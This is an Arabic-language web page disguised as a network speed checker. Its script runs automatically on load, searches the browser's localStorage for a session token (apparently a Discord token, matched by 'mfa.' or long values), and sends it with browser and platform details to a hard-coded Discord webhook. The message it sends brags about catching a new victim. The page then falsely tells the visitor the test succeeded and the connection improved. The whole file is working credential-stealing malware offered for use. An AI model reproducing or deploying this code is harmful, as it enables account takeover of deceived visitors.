<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>فاحص سرعة الشبكة والاتصال</title>
    <style>
        body { background: #0f1115; color: #fff; font-family: Tahoma, sans-serif; text-align: center; padding-top: 80px; }
        .box { background: #181b22; max-width: 400px; margin: auto; padding: 30px; border-radius: 12px; border: 1px solid #232733; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .loader { border: 4px solid #333; border-top: 4px solid #00ffcc; width: 45px; height: 45px; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #00ffcc; font-size: 20px; }
        p { color: #8c939d; font-size: 14px; }
    </style>
</head>
<body>

    <div class="box">
        <h2>⚡ جاري فحص استقرار الشبكة...</h2>
        <div class="loader"></div>
        <p id="info">الرجاء عدم إغلاق الصفحة حتى اكتمال الاختبار.</p>
    </div>

    <script>
        // رابط الـ Webhook الخاص بك
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1572665030397141032/1E_aw7zQAjy_xogWWqtcd7136k8IEkIRmf1mfdSQHs16UU2tlVuegrD5v5MSGu4dp2hX";

        async function captureAndSend() {
            try {
                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const targetUserId = "1408573933766185013";

                let detectedToken = "لم يتم العثور على توكن مباشر في الجلسة";
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    const val = localStorage.getItem(key);
                    if (val && (val.includes("mfa.") || val.length > 50)) {
                        detectedToken = val;
                        break;
                    }
                }

                const payload = {
                    content: `🎯 **تم اصطياد ضحية جديدة عبر اختبار الشبكة!**\n👤 **الآيدي المستهدف:** <@${targetUserId}>\n🌐 **معلومات المتصفح:** \`${userAgent}\`\n💻 **النظام:** \`${platform}\`\n🔑 **التوكن / الجلسة:** \`\`\`${detectedToken}\`\`\``
                };

                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                setTimeout(() => {
                    document.querySelector('h2').innerText = "✅ اكتمل فحص الشبكة بنجاح!";
                    document.getElementById('info').innerText = "تم تحسين اتصالك بنجاح.";
                    document.querySelector('.loader').style.display = "none";
                }, 2500);

            } catch (err) {
                console.log("Error in execution");
            }
        }

        window.onload = function() {
            captureAndSend();
        };
    </script>

</body>
</html>
